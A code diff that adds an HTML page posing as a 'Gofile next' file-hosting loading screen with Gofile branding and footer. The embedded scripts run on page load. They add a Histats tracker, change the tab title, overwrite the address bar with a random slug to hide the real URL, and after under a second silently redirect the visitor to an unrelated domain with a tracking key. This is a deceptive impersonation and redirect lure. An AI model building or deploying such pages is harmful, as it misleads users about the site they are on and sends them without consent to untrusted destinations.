@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gofile next</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @keyframes spin-smooth {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .spinner-container {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner-ring {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            border-top: 3px solid #3b82f6; 
+            border-right: 1px solid rgba(59, 130, 246, 0.2);
+            animation: spin-smooth 0.8s linear infinite;
+            box-shadow: 0 0 10px rgba(59, 130, 246, 0.1);
+        }
+
+        body {
+            background-color: #1a202c; 
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen text-slate-400 font-sans selection:bg-blue-500/30">
+
+    <header class="p-4 border-b border-white/5 flex items-center justify-between">
+        <button class="bg-[#3b82f6] p-2 rounded-md hover:bg-blue-500 transition-all active:scale-95 shadow-lg">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M4 6h16M4 12h16M4 18h16" />
+            </svg>
+        </button>
+    </header>
+
+    <main class="flex-grow flex items-center justify-center">
+        <div class="spinner-container">
+            <div class="spinner-ring"></div>
+        </div>
+    </main>
+
+    <footer class="py-12 px-6 text-center border-t border-white/5 space-y-8">
+        <nav class="flex flex-col space-y-4 text-[15px] tracking-wide">
+            <a href="#" class="hover:text-blue-400 transition-colors">Home</a>
+            <a href="#" class="hover:text-blue-400 transition-colors">Terms of Service</a>
+            <a href="#" class="hover:text-blue-400 transition-colors">Privacy Policy</a>
+            <a href="#" class="hover:text-blue-400 transition-colors">Copyright</a>
+            <a href="#" class="hover:text-blue-400 transition-colors">Contact</a>
+        </nav>
+        
+        <div class="text-[13px] text-slate-500 pt-4">
+            WOJTEK SAS © 2026, made with 
+            <span class="inline-block animate-pulse text-red-500 mx-1">❤️</span> 
+            by Gofile Team
+        </div>
+    </footer>
+
+    <script>
+    history.replaceState(null, "", "/");
+    document.title = "mom";
+
+    if (!sessionStorage.getItem("histats_hit")) {
+      sessionStorage.setItem("histats_hit", "1");
+
+      var _Hasync = _Hasync || [];
+      _Hasync.push(['Histats.start','1,4971849,4,0,0,0,00000000']);
+      _Hasync.push(['Histats.fasi','1']);
+      _Hasync.push(['Histats.track_hits','']);
+
+      (function() {
+        var hs = document.createElement('script');
+        hs.async = true;
+        hs.src = '//s10.histats.com/js15_as.js';
+        document.body.appendChild(hs);
+      })();
+    }
+    </script>
+
+    <script>
+    setTimeout(() => {
+      const c = "abcdefghijklmnopqrstuvwxyz0123456789";
+      let slug = "";
+      for (let i = 0; i < 4; i++) {
+        slug += c[Math.floor(Math.random() * c.length)];
+      }
+      history.replaceState(null, "", "/" + slug);
+    }, 200);
+    
+
+   setTimeout(() => {
+  document.body.classList.add("fade-out");
+  setTimeout(() => {
+    location.href = "https://braverybreezebinding.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb";
+  }, 600);
+}, 800);
+</script>
+</body>
+</html>
